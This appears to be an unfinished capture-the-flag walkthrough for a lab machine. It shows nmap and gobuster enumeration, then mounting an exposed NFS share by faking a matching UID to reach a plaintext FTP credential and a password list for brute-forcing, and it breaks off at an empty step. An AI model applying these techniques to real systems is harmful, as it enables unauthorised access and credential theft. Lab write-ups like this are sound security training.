WIP
> Misconfigs conquered, identities claimed.
#### Steps
1. I started out with a verbose `nmap` scan
```
└─$ nmap -sV 10.10.218.211 -v
[ ... REDACTED ... ]
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
111/tcp  open  rpcbind 2-4 (RPC #100000)
2049/tcp open  nfs_acl 2-3 (RPC #100227)
```
2. I immedately tried to log into `ftp` with anonymous access but that didn't work
3. Navigating to the website didn't turn up much either, creating an account didn't turn up any new pages (though we come back to it later on) and the administrator page didn't have immediate new info
4. I used `gobutser` for directory busting with this command:
```
└─$ gobuster dir -u http://10.10.218.211 -w /usr/share/dirb/wordlists/common.txt
```
5. But that also didn't turn up anything interesting
6. Next I moved on to the rpc ports. `2049` didn't reveal anything, but running a script scan on port `111` I found a mountpoint
```
└─$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.218.211
PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /mnt/share *
```
7. You can also get similar results with `showmount -e [IP]`
8. I created a moutpoint directory and mounted the file with `└─$ sudo mount -t nfs 10.10.218.211:/mnt/share miscon_tmp`, but since the user and group `1003` didn't match my machine, I wasn't able to view the file
```
drwx------  2     1003     1003  4096 Aug  8  2023 miscon_tmp
```
9. To bypass this I created a new user and modified the user and group IDs to match the file
```
sudo adduser hijack
sudo passwd hijack
sudo nano /etc/passwd
hijack:x:1003:1003::/home/hijack:/bin/sh
```
10. I also created a home directory for the hijack user, unmounted the file, and remounted it in hijack's home directory to avoid having to mess with permission configuration
```
└─$ su hijack                                            
Password: 
$ /bin/bash
hijack@kali:~$ ls
miscon_tmp
hijack@kali:~$ cd miscon_tmp/
hijack@kali:~/miscon_tmp$ ls
for_employees.txt
hijack@kali:~/miscon_tmp$ cat for_employees.txt 
ftp creds :

ftpuser:W3stV1rg1n14M0un741nM4m4
```
11. ftp password!
12. All files on the ftp server were hidden so I used `ls -la` to view them
```
ftp> ls -la
229 Entering Extended Passive Mode (|||39262|)
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 Aug 08  2023 .
drwxr-xr-x    2 1002     1002         4096 Aug 08  2023 ..
-rwxr-xr-x    1 1002     1002          220 Aug 08  2023 .bash_logout
-rwxr-xr-x    1 1002     1002         3771 Aug 08  2023 .bashrc
-rw-r--r--    1 1002     1002          368 Aug 08  2023 .from_admin.txt
-rw-r--r--    1 1002     1002         3150 Aug 08  2023 .passwords_list.txt
-rwxr-xr-x    1 1002     1002          655 Aug 08  2023 .profile
```
13. I copied the admin and password files to my host machine with `mget .*` this is `.from_admin.txt`:
```
To all employees, this is "admin" speaking,
i came up with a safe list of passwords that you all can use on the site, these passwords don't appear on any wordlist i tested so far, so i encourage you to use them, even me i'm using one of those.

NOTE To rick : good job on limiting login attempts, it works like a charm, this will prevent any future brute forcing.
```
14. From this we have a username `rick` and the other file provides the password list for bruteforcing (through there is rate limiting in place)
15. 
